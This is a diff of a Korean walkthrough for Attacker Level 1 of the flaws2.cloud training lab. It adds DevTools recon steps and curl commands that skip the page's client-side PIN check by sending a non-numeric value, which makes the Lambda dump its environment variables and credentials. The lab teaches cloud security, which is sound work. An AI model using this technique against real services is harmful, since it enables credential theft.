@@ -1,9 +1,9 @@
 # Attacker Level 1 — Lambda 에러 응답에서 자격증명 탈취
 
-> **URL**: http://level1.flaws2.cloud/
-> **API 엔드포인트**: https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1
-> **핵심 기술**: 클라이언트 측 유효성 검사 우회 · Lambda 환경변수 유출
-> **난이도**: ⭐⭐
+> **URL**: http://level1.flaws2.cloud/<br>
+> **API 엔드포인트**: https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1<br>
+> **핵심 기술**: 클라이언트 측 유효성 검사 우회 · Lambda 환경변수 유출<br>
+> **난이도**: ⭐⭐<br>
 > **본인 AWS 계정 필요**: ❌
 
 ## 🎯 목표
@@ -41,22 +41,43 @@
 
 ## 🔍 정찰
 
-### 1. 페이지 소스에서 API 엔드포인트 확인
+### 0. 일단 브라우저로 페이지 확인
+
+![Level 1 PIN 입력 페이지](../../assets/flaws2-attacker-l1-page.png)
+
+PIN 4자리를 넣는 폼이 전부. "100자리 PIN 이라 brute force 불가" 라는 문구가 힌트.
+
+### 1. DevTools Network 탭으로 실제 요청 URL 확인 (브라우저 권장)
+
+왜 DevTools 인가 — 폼이 **어디로** 무엇을 **어떻게** 보내는지 눈으로 확인하면 이후 조작이 명쾌해진다.
+
+1. **DevTools 열기**
+   - Chrome/Edge (macOS): <kbd>⌥</kbd>+<kbd>⌘</kbd>+<kbd>I</kbd>  (Windows/Linux: <kbd>F12</kbd>)
+   - Safari: 환경설정 → 고급 → "메뉴 막대에서 개발자용 메뉴 보기" → <kbd>⌥</kbd>+<kbd>⌘</kbd>+<kbd>I</kbd>
+2. **Network 탭 선택** → **Preserve log** 체크 (리다이렉트로 요청이 사라지지 않게)
+3. PIN 칸에 아무 숫자(예: `1234`) 입력 후 **Submit**
+4. 맨 위 엔트리(`level1?code=1234`) 클릭 → **Headers** 에서 `Request URL` 확인
+5. 그 엔트리 우클릭 → **Copy → Copy as cURL** 하면 재전송에 쓸 명령이 클립보드에 복사됨
+
+### 2. 터미널에서 같은 정보 얻기 (DevTools 없이)
 ```bash
 curl -s http://level1.flaws2.cloud/ | grep -Eo 'execute-api[^"]+' | head -1
 # execute-api.us-east-1.amazonaws.com/default/level1
 ```
 
-### 2. 정상 요청 (숫자) — 반응 확인
+### 3. 정상 요청 (숫자) — 반응 확인
 ```bash
 curl -s "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=1234"
 # 페이지가 "Incorrect" 로 리다이렉트됨
 ```
 
-### 3. JS 검증 우회 — 숫자가 아닌 값 전송
+### 4. JS 검증 우회 — 숫자가 아닌 값 전송
 ```bash
 curl -s "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=a"
 ```
+서버가 환경변수를 통째로 덤프하는 걸 볼 수 있다:
+
+![code=a 호출 시 Lambda env JSON 덤프 (브라우저 JSON 뷰어)](../../assets/flaws2-attacker-l1-errorresp.png)
 
 ## 🧨 취약점 원리
 
